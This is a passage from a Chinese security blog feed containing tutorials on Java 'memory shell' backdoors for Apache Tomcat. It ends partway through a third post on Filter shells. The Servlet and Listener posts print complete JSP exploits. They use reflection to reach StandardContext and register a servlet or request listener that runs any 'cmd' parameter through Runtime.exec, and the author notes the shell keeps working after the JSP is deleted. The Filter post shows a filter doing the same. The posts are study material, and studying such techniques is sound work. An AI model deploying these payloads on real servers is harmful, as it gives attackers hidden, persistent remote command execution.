手写servlet马</h2><p>依照读取web.xml的这几个步骤将servlet的相关信息以代码的方式添加到context中</p><p>首先是如何获取到context，之前分析其他内存马也提到jsp页面中存在request隐式对象，可以通过request对象获取到context（也就是StandardContext）request对象定义有getServletContext方法，可以获取到ServletContext，</p><img src="/2023/08/26/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Servlet%E5%86%85%E5%AD%98%E9%A9%AC/8.png" class><p>通过反射获取context字段里的ApplicationContext</p><img src="/2023/08/26/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Servlet%E5%86%85%E5%AD%98%E9%A9%AC/9.png" class><p>而在ApplicationContext里也有context字段，里面正是我们要获取的StandardContext上下文。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">ApplicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">ApplicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) ApplicationContextField.get(servletContext);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">StandardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">StandardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) StandardContextField.get(applicationContext);</span><br></pre></td></tr></table></figure><p>两部反射获取属性得到上下文，剩下的就好弄了，根据上面读取web.xml的步骤添加信息，</p><p>实例化一个wrapper,</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br></pre></td></tr></table></figure><p>wrapper中有内置的一个方法获取实例化的servlet，对我们自己定义的servlet类加载</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wrapper.setServlet(new evalServlet());</span><br></pre></td></tr></table></figure><p>然后将servlet的名称以及类名添加到wrapper中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wrapper.setName(&quot;evalServlet&quot;);</span><br><span class="line">wrapper.setServletClass(evalServlet.class.getName());</span><br></pre></td></tr></table></figure><p>最后将wrapper添加到上下文中，并且获取到servlet的映射信息，也就是路由</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">standardContext.addChild(wrapper);</span><br><span class="line">standardContext.addServletMappingDecoded(&quot;/evalServlet&quot;,&quot;evalServlet&quot;);</span><br></pre></td></tr></table></figure><p>最终的servlet内存马如下</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evalServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//获取StandardContext</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> (ServletContext) request.getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">ApplicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    ApplicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) ApplicationContextField.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">StandardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    StandardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) StandardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line"></span><br><span class="line">    wrapper.setName(<span class="string">&quot;evalServlet&quot;</span>);</span><br><span class="line">    wrapper.setServletClass(evalServlet.class.getName());</span><br><span class="line"></span><br><span class="line">    wrapper.setServlet(<span class="keyword">new</span> <span class="title class_">evalServlet</span>());</span><br><span class="line"></span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/evalServlet&quot;</span>,<span class="string">&quot;evalServlet&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>重启服务器，演示一下</p><img src="/2023/08/26/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Servlet%E5%86%85%E5%AD%98%E9%A9%AC/10.png" class><p>这样一个servlet内存马就注册成功了，jsp文件删除后仍然可以执行命令。</p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java内存马连续剧——Listener内存马</title>
      <link href="/2023/08/19/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Listener%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2023/08/19/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Listener%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-什么是Listener内存马"><a href="#0x01-什么是Listener内存马" class="headerlink" title="0x01 什么是Listener内存马"></a>0x01 什么是Listener内存马</h2><h3 id="什么是Listener"><a href="#什么是Listener" class="headerlink" title="什么是Listener"></a>什么是Listener</h3><p>和 Filter 一样，监听器是 JavaWeb 三大组件之一。它是一个实现特定接口的java程序，这个程序用于监听web应用中的一些对象，信息的创建，添加，销毁等，然后针对于这些情况做出相应处理。总结来说，就是在application，session，request三个对象创建消亡或者往其中添加修改删除属性时自动执行代码的功能组件。</p><h3 id="Listener的三大域对象"><a href="#Listener的三大域对象" class="headerlink" title="Listener的三大域对象"></a>Listener的三大域对象</h3><p>监听器有三个域对象，指的是在监听器中可以访问的特定范围内的数据对象。分别为</p><blockquote><p>ServletContext域对象——用于在整个 Java Web 应用程序中共享数据、资源和配置信息。</p><p>ServletRequest域对象——用于在一次 HTTP 请求处理期间共享数据和信息。</p><p>HttpSession域对象——用于在用户会话期间存储和共享数据，跨足够长的时间间隔保持信息状态。</p></blockquote><p>根据不同域对象的功能，很明显 ServletRequest 类型是适合注入内存马的，我们注入一个有恶意代码的ServletRequest类型的监听器，当有HTTP请求处理时，注入的监听器就会发挥作用，执行恶意代码，这就是Listener内存马。</p><h2 id="0x02-代码实现"><a href="#0x02-代码实现" class="headerlink" title="0x02 代码实现"></a>0x02 代码实现</h2><p>创建一个ServletRequest类型的监听器，继承 ServletRequestListener 接口，需要重写requestInitialized方法，和过滤器的doFilter方法一样，requestInitialized方法也是处理监听器业务的方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Listener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Listener被执行&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码很短，只用作测试</p><p>同时需要修改 web.xml 配置文件</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>Listener.MyListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure><p>启动服务器，</p><img src="/2023/08/19/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Listener%E5%86%85%E5%AD%98%E9%A9%AC/1.png" class><p>可以在日志中看到输出信息，监听器被调用，requestInitialized方法被执行</p><h2 id="0x03-流程分析"><a href="#0x03-流程分析" class="headerlink" title="0x03 流程分析"></a>0x03 流程分析</h2><p>想要成功注册Listener内存马，必须要了解Listener的生成以及调用</p><h3 id="读取配置文件"><a href="#读取配置文件" class="headerlink" title="读取配置文件"></a>读取配置文件</h3><p>在应用启动的时候，ContextConfig 类首先会去读取配置文件，主要方法是configureContext，在这个方法下个断点</p><img src="/2023/08/19/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Listener%E5%86%85%E5%AD%98%E9%A9%AC/3.png" class><p>首先确定 Servlet 上下文的配置信息，然后会遍历这个xml配置文件里的Filter和Listener，这里遍历到MyListener这个监听器，然后调用 StandardContext 的 addApplicationListener 方法，跟进</p><img src="/2023/08/19/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Listener%E5%86%85%E5%AD%98%E9%A9%AC/4.png" class><p>在这之前做一些检查，检查是否存在相同的监听器，然后整合起来，把它赋值为 applicationListeners 数组里</p><p>到这调试就结束，只要知道解析完web.xml里的Listener后，会把解析完的监听器添加到applicationListeners 数组里就够了。</p><h3 id="Listener被调用"><a href="#Listener被调用" class="headerlink" title="Listener被调用"></a>Listener被调用</h3><p>读取配置文件之后，StandardContext 会首先调用 listenerStart 方法，经过一些检查，然后开启监听。</p><p>断点不能直接下在requestInitialized方法里，因为流程差不多调用完了，没东西了。把断点下在StandardContext类的fireRequestInitEvent方法里</p><img src="/2023/08/19/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Listener%E5%86%85%E5%AD%98%E9%A9%AC/2.png" class><p>开始调试</p><img src="/2023/08/19/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Listener%E5%86%85%E5%AD%98%E9%A9%AC/5.png" class><p>跟进 getApplicationEventListeners 方法</p><img src="/2023/08/19/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Listener%E5%86%85%E5%AD%98%E9%A9%AC/6.png" class><p>获取存放监听器的数组，查找用法，看看什么地方调用了 applicationEventListenersList </p><img src="/2023/08/19/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Listener%E5%86%85%E5%AD%98%E9%A9%AC/7.png" class><p>这个方法是将监听器放进这个数组里，继续往下看</p><img src="/2023/08/19/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Listener%E5%86%85%E5%AD%98%E9%A9%AC/8.png" class><p>对监听器数组进行遍历，判断是否继承了 ServletRequestListener 接口，最终调用 requestInitialized 方法，到此分析流程结束。</p><h2 id="0x04-攻击思路与exp编写"><a href="#0x04-攻击思路与exp编写" class="headerlink" title="0x04 攻击思路与exp编写"></a>0x04 攻击思路与exp编写</h2><p>回想分析流程，遍历监听器数组，然后调用，我们的目标是将自己构造的Listener添加到数组中去，也就是 addApplicationEventListener 方法，通过反射将恶意的Listener添加进去。</p><p>还是首先构造上下文，也就是 StandardContext 通过执行流找到上下文生成的地方</p><img src="/2023/08/19/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Listener%E5%86%85%E5%AD%98%E9%A9%AC/9.png" class><p>这里通过 request 对象来创建，JSP内置了request对象，通过反射构造 StandardContext 对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getServletContext();  </span><br><span class="line"><span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">applicationContextField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);  </span><br><span class="line">  </span><br><span class="line"><span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">standardContextField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);  </span><br></pre></td></tr></table></figure><p>然后编写一个恶意的Listener，最终写个jsp，完整exp（贴上师傅代码）</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Arrays&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;  </span><br><span class="line">&lt;%!  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ListenerMemShell</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">            String cmd;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                cmd = sre.getServletRequest().getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">                org.apache.catalina.connector.<span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (org.apache.catalina.connector.RequestFacade) sre.getServletRequest();  </span><br><span class="line">                <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span>).getDeclaredField(<span class="string">&quot;request&quot;</span>);  </span><br><span class="line">                requestField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestField.get(requestFacade);  </span><br><span class="line">                <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="literal">null</span>)&#123;  </span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();  </span><br><span class="line">                    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;  </span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];  </span><br><span class="line">                    <span class="keyword">while</span> ((i=inputStream.read(bytes)) != -<span class="number">1</span>)&#123;  </span><br><span class="line">                        response.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,i));  </span><br><span class="line">                        response.getWriter().write(<span class="string">&quot;\r\n&quot;</span>);  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;  </span><br><span class="line">                e.printStackTrace();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">%&gt;  </span><br><span class="line">  </span><br><span class="line">&lt;%  </span><br><span class="line"><span class="comment">//获取standardContext上下文</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getServletContext();  </span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">    applicationContextField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);  </span><br><span class="line">  </span><br><span class="line">    Object[] objects = standardContext.getApplicationEventListeners();  </span><br><span class="line">    List&lt;Object&gt; listeners = Arrays.asList(objects);  </span><br><span class="line">    List&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(listeners);  </span><br><span class="line">    arrayList.add(<span class="keyword">new</span> <span class="title class_">ListenerMemShell</span>());  </span><br><span class="line">    standardContext.setApplicationEventListeners(arrayList.toArray());  </span><br><span class="line">  </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>上传jsp文件</p><img src="/2023/08/19/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Listener%E5%86%85%E5%AD%98%E9%A9%AC/10.png" class><p>成功执行，即使文件删除，仍然可以执行命令。</p><p>参考链接：</p><p><a href="https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/#Listener-%E4%B8%89%E4%B8%AA%E5%9F%9F%E5%AF%B9%E8%B1%A1">https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/#Listener-%E4%B8%89%E4%B8%AA%E5%9F%9F%E5%AF%B9%E8%B1%A1</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java内存马连续剧——Filter内存马</title>
      <link href="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<p>知识基础：</p><p>刚开始内存马的这块学习与反序列化并无太大关系，反而与javaweb，tomcat联系更加紧密。所以在学习内存马之前需要先了解JSP，java web的三大件，Servlet，Filter，Listener的基本知识和工作流程和Tomcat 架构的相关内容。</p><h2 id="0x01-什么是Filter马"><a href="#0x01-什么是Filter马" class="headerlink" title="0x01 什么是Filter马"></a>0x01 什么是Filter马</h2><p>内存马就是无文件木马，无文件落地，它通常会存在进程，内存或者java虚拟机中，特点更加隐蔽，难以排查，并且也难以删除。而今天学习的Filter内存马是传统web应用型内存马，主要将恶意代码注入到过滤器中，当过滤器拦截servlet请求的参数时，过滤器中的恶意代码就会执行。</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>首先配置一个 servlet 的web项目，</p><img src="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/1.png" class><p>然后一直点下一步就好了，它会自动帮我们生成一个简单的servlet</p><p>pom.xml中导入tomcat相关依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.38<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-websocket<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.38<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>方便之后调试代码，在这之后我们创建一个自定义的Filter过滤器</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.memoryhorse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行过滤功能&quot;</span>);</span><br><span class="line">        servletRequest.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        servletResponse.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        servletResponse.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">        System.out.println(servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">        Runtime.getRuntime().exec(servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重写了doFilter方法，里面添加恶意代码，接收cmd参数，执行任意命令。web.xml中配置相关参数</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>MyFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.example.memoryhorse.MyFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>MyFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/MyFilter<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里我定义的是&#x2F;MyFilter路由，在访问这个路由时，就会被我们自定义的过滤器拦截</p><h2 id="0x03-Filter内存马探索"><a href="#0x03-Filter内存马探索" class="headerlink" title="0x03 Filter内存马探索"></a>0x03 Filter内存马探索</h2><p>这个时候是不是就有点像内存马的样子，我们注册了一个恶意的 &#x2F;MyFilter 路由，访问这个路由可以执行任意代码。测试一下</p><img src="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/2.png" class><p>成功弹出计算器，这也是注入Filter内存马的一个抽象的体现。然而在实际攻防场景中，我们不可能在别人服务器上插入自己自定义的过滤器，web.xml这个配置文件也不是那么容易修改，就算修改了配置文件也很好排查，起不到隐秘的效果，要想动态的注册Filter马，就必须弄清楚过滤器的创建和调用过程。</p><h3 id="1-tomcat-Filter-的流程分析"><a href="#1-tomcat-Filter-的流程分析" class="headerlink" title="1.tomcat Filter 的流程分析"></a>1.tomcat Filter 的流程分析</h3><p>在MyFilter的doFilter方法里下个断点，访问&#x2F;MyFilter路由，会被我们自定义的过滤器拦截，doFilter方法是处理过滤功能的方法，开始调试</p><img src="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/3.png" class><p>这个filterChain是一个过滤器链，通过调试看到里面存放着两个过滤器，一个是我们自定义的，一个是 tomcat 自带的，跟进它的doFilter方法</p><p>判断 Globals.IS_SECURITY_ENABLED 安全模式是否开启，这里判断false，</p><img 